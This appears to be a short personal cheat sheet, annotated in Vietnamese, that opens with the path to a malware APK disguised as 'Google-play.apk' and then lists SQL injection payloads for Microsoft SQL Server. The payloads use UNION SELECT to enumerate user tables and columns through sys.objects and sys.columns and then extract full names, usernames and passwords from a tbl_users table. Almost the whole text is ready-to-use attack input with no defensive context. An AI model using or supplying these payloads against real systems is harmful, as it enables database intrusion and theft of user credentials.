/home/erik/Documents/malwareAPK/Google-play.apk

sys.objects sys.tables sys.columns 
sss%' union select '', name, object_id from sys.objects where type='u' -- 
Tìm các cột của bang tbl_users 
sss' union select '', name, 0 from sys.columns where object_id = 2105058535 -- 

Đọc tất cả các cột của các bang: sss%' union select a.name, b.name, 0 from sys.objects a inner join sys.columns b on a.object_id = b.object_id where a.type='u' -- 

Lấy dữ lieu từ bang tbl_users: sss' union select Full_name, username+'-'+password, account_id from tbl_users -- 
